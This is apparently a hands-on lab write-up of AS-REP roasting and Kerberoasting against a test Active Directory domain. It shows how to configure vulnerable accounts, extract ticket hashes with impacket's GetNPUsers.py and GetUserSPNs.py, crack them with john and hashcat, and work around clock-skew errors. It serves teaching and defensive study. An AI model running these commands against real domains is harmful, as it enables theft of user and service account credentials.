**Roasting Attacks**

In the context of Active Directory, roasting attacks on the Kerberos protocol are based on the ability of an attacker to capture tickets encrypted with users or services passwords.

We understand that in Kerberos, different messages are sent and these messages are encrypted with different keys. Some of these keys are temporary session keys that are only valid for that particular session. Some messages are encrypted with long-term keys.

<img width="602" height="552" alt="image" src="https://github.com/user-attachments/assets/df722677-a239-4de9-910a-c5f512327d77" />

Now, attackers are interested especially on two messages, AS-REP message and TGS-REP message.

In AS-REP message contains the Client key. If an attacker reads this message, he can try to brute force the Client key.

Similarly TGS-REP message contains Service Ticket which is encrypted by Service key. If an attacker reads this message, he can try to brute force the Service key.

**AS-REP Roasting Attack**

This attack target user accounts for which kerberos does not enforce pre-authentication.

To perform this attack, we don't need any credentials. However, this attack will only work for those user account where pre-authentication is disabled.

Lets create a user for this demo attack

***New-ADUser -Name "asrep" -SamAccountName "asrep" -UserPrincipalName "asrep@hexdump.lab" -AccountPassword (ConvertTo-SecureString -AsPlainText "Hexdump123!" -Force) -Enabled $true***

It will create a new AD user asrep and enable it

<img width="800" height="90" alt="image" src="https://github.com/user-attachments/assets/ca818d10-269e-4c51-b025-ce40cb0b0e8c" />

User is created, lets verity

***Get-ADUser -Identity asrep***

<img width="738" height="377" alt="image" src="https://github.com/user-attachments/assets/262df5e5-c3a5-4ac8-b026-b1ba4d6f3048" />

Now, we will disable the pre-authentication of the user in Kerberos. By default pre-authentication is not disabled.

***Win + R >> dsa.msc***

<img width="800" height="606" alt="image" src="https://github.com/user-attachments/assets/6e07efa9-4609-489d-86c9-72e99f287954" />

Lets validate

***Get-ADUser -Identity "asrep" -Properties DoesNotRequirePreAuth | Select-Object Name, DoesNotRequirePreAuth***

<img width="800" height="133" alt="image" src="https://github.com/user-attachments/assets/cc08391d-5845-45dc-9794-71f6bd37b6cc" />

Now, lets start the attack.

First we have to open a new environment and install impacket

<img width="800" height="306" alt="image" src="https://github.com/user-attachments/assets/43c7c77c-95f9-4d40-b837-0117984e9c2e" />

GetNPUsers.py <domain name>/<username> -dc-ip <IP address>-no-pass

***GetNPUsers.py hexdump.lab/asrep -dc-ip 192.168.1.10 -no-pass***

<img width="800" height="150" alt="image" src="https://github.com/user-attachments/assets/5ffbc5e1-a06d-45a3-99ae-be479d4e2fa1" />

Now, we got this encrypted text. We can crack it using John

We have put this encrypted text in a file asrep_file.txt

Also, we have password.txt file which contains list of passwords.

***john --wordlist=passwords.txt asrep_file.txt***

<img width="800" height="273" alt="image" src="https://github.com/user-attachments/assets/51b30e72-eea1-4714-93d1-ab89e1a68377" />

We got the password i.e Hexdump123!

We can use hashcat as well to crack the password

***hashcat -m 18200 asrep_file.txt passwords.txt***

Now, please note that we need to know the username to perform this attack. Also that user must be configured without pre-authentication.

**Kerberoasting Attack**

Kerberoasting targets accounts that have a registered Service Principal Name (SPN). That is, services that are registered with Kerberos.

If we dont have any account that is not registered, we cannot perform Kerberoasting. But we can perform AS-REP Roasting Attack.

This is because Kerberoasting comes later in the Kerberos authentication flow. It comes in the 2nd set of response after authentication with authentication server of the KDC.

<img width="778" height="157" alt="image" src="https://github.com/user-attachments/assets/e6e9379f-91a7-4a45-aa70-1557038ec20a" />

During Kerberos authentication, after the TGT has been obtained, you can ask for a ST.

Now, to ask for the Service Ticket, we need to specify the Service Principal Name (SPN). This is way the account that we will attack must have at least one SPN.

The Service Ticket is encrypted with the session key derived from the service account long term password.

Once the attacker obtains the ST, it is then possible to crack it. If the crack attempt is succesful, the attacker is able to obtain the password of the service account.

Notice that for this attack to work it is needed to know the credentials of a user account that can be authenticated with Kerberos.

Lets create a user for this demo attack

***New-ADUser -Name "kerb" -SamAccountName "kerb" -UserPrincipalName "kerb@hexdump.lab" -AccountPassword (ConvertTo-SecureString -AsPlainText "Hexdump123!" -Force) -Enabled $true****

It will create a new AD user asrep and enable it

<img width="800" height="119" alt="image" src="https://github.com/user-attachments/assets/32cffe4d-634f-46ee-b57b-d0ff32138610" />

User is created, lets verity

***Get-ADUser -Identity kerb***

<img width="773" height="360" alt="image" src="https://github.com/user-attachments/assets/3c4e0d85-ed5f-4556-9116-c9a9d4538e4a" />

Now we will assign a SPN to the user

***Set-ADUser -Identity "kerb" -ServicePrincipalNames @{Add="HTTP/kerb.hexdump.lab"}***

<img width="800" height="96" alt="image" src="https://github.com/user-attachments/assets/1e54dc8e-9ac2-43cd-8d9e-068bfe474f34" />

We have defined to SPN, lets verify

***Get-ADUser -Identity "kerb" -Properties ServicePrincipalNames***

<img width="800" height="330" alt="image" src="https://github.com/user-attachments/assets/865f2fa6-3568-480f-8ca9-b0d862581f98" />

We can also use ***setspn -L kerb***

<img width="800" height="132" alt="image" src="https://github.com/user-attachments/assets/ed558b26-0f86-4a49-94d6-383229f59f5a" />

Now, lets start the attack

**Step 1** >> List of the SPNs on which we can perform Kerberosting attack

GetUserSPNs.py hexdump.lab/leo:'Hexdump123!' -dc-ip 192.168.1.10

<img width="800" height="145" alt="image" src="https://github.com/user-attachments/assets/8558d186-8ef7-475f-90f9-2d5376515f12" />

We got two users. User leo also has SPN configured.

**Step 2** >> Perform the attack on a specific username

***GetUserSPNs.py hexdump.lab/leo:'Hexdump123!' -dc-ip 192.168.1.10 -request-user kerb***

<img width="800" height="415" alt="image" src="https://github.com/user-attachments/assets/e11d5974-d076-4a8b-ac6d-2588dba594fd" />

We got the encrypted text. This is the service ticket that is used to access the Service Principal Name (HTTP/kerb.hexdump.lab)

We have put this encrypted text in a file kerb_user.txt

Also, we have password.txt file which contains list of passwords.

***john --wordlist=passwords.txt kerb_user.txt***

<img width="800" height="194" alt="image" src="https://github.com/user-attachments/assets/85cee496-9125-4868-a611-ec3235ce0bce" />

And we got the password i.e Hexdump123!

Lets check with hashcat

***hashcat -m 13100 kerb_user.txt passwords.txt***

<img width="800" height="608" alt="image" src="https://github.com/user-attachments/assets/8f9cd40d-317e-4958-9b58-1dfb4bcb6c70" />

Now, we can also attack on user leo as well because SPM is also set for leo user as well.

***GetUserSPNs.py hexdump.lab/leo:'Hexdump123!' -dc-ip 192.168.1.10 -request-user leo***

<img width="800" height="344" alt="image" src="https://github.com/user-attachments/assets/eda50637-cabe-4499-9aa0-6dfd6b7d2257" />

Now, if we want to perform this attack on all the user

***GetUserSPNs.py hexdump.lab/leo:'Hexdump123!' -dc-ip 192.168.1.10 -request***

<img width="800" height="564" alt="image" src="https://github.com/user-attachments/assets/d2475843-4f07-44ea-ac03-594689723c21" />

Now sometime we can get timestamp error

<img width="800" height="165" alt="image" src="https://github.com/user-attachments/assets/c4677857-1e39-4b03-af7f-89b6f1d6143c" />

Here we are performing attack on user kerberosting.

We got an error Clock skew too great

Lets say the client has a different time zone and server has a different time zone. So there will be difference in the time between client and server.

So in this case we need to sync client clock with the Domain Controller

We will disable the time demon on kali machine

***sudo timedatectl set-ntp off***

Then we will sync our time with DC time

***sudo ntpdate -u 192.168.1.10***

<img width="712" height="107" alt="image" src="https://github.com/user-attachments/assets/c1a8dbc4-a560-4013-be6d-b7e9c6b7a450" />

Lets try the attack again

<img width="800" height="242" alt="image" src="https://github.com/user-attachments/assets/c3d0f0bb-c472-4afc-8e9e-8159ecb8dc5d" />

And this time the attack worked
